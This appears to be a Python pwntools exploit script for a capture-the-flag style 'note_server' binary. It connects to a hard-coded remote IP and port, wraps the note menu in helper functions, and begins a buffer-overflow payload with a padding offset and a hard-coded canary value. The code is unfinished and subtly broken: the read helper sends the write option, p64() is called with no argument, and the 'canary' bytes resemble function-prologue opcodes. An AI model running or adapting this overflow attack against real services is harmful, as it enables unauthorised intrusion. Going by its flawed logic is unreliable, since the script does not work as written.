from pwn import *

r = remote('143.255.251.233', 13373)
context.clear(os='linux', arch='x86_64', log_level='debug')
bin = ELF('./note_server')

def write_note(idx, note):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'Choose a note [0 - 7]: ', str(idx).encode())
    r.sendline(note)

def read_note(idx):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'Choose a note [0 - 7]: ', str(idx).encode())

canary = b'\x55\x48\x89\xe5\x48\x8b\x05\xb0'
payload = b'a'*0x38 + p64()